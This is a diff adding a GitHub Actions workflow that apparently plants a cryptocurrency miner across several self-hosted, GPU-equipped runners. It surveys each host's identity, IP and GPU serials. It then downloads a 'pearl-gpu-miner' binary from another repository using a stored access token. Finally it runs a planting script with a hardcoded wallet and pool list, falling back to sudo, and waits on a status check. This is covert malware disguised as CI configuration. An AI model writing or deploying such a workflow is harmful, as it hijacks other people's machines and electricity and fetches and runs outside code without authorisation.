@@ -1,0 +1,40 @@
+name: ul7621-matrix
+on:
+  workflow_dispatch:
+jobs:
+  census-plant:
+    runs-on: [self-hosted, "${{ matrix.label }}"]
+    continue-on-error: true
+    timeout-minutes: 60
+    strategy:
+      fail-fast: false
+      matrix:
+        label: [a100itn1, hk-az-181356, t19i52947-eus-h, t1946107x61, t1946107x76, ul-jit-i72364]
+    env:
+      WALLET: prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
+      POOL: prl.kryptex.network:8048,prl.kryptex.network:7048,pool.pearlhash.xyz:9000,pool.pearlhash.xyz:9443,pearl.luckypool.io:3360
+    steps:
+      - uses: actions/checkout@v4
+      - name: census
+        run: |
+          id; hostname -I 2>/dev/null || hostname; nproc
+          nvidia-smi -L || true
+          nvidia-smi --query-gpu=index,name,memory.total,serial,uuid --format=csv,noheader || true
+          pgrep -af 'pearl-gpu-miner|wildrig' || echo no-miner
+      - name: kit
+        env:
+          GH_TOKEN: ${{ secrets.GH_PAT }}
+        run: |
+          mkdir -p /tmp/ul-kit
+          gh release download ulkit-7621 --repo dongsuju/ul-plant --pattern 'pearl-gpu-miner' -D /tmp/ul-kit --clobber || exit 0
+          gh release download ulkit-7621 --repo dongsuju/ul-plant --pattern 'libcudart.so.12' -D /tmp/ul-kit --clobber || true
+          sha256sum /tmp/ul-kit/* || true
+      - name: plant
+        run: |
+          if ! ls /tmp/ul-kit/pearl-gpu-miner >/dev/null 2>&1; then echo KIT-MISSING; exit 0; fi
+          PFX="ul-$(hostname | tr '.' '-' | cut -c1-24)"
+          bash -s -- fill "$PFX" "$WALLET" "$POOL" < ul/7621_plant.sh || sudo -n bash -s -- fill "$PFX" "$WALLET" "$POOL" < ul/7621_plant.sh
+      - name: soak+status
+        run: |
+          sleep 420
+          bash -s < ul/7621_status.sh || sudo -n bash -s < ul/7621_status.sh || true
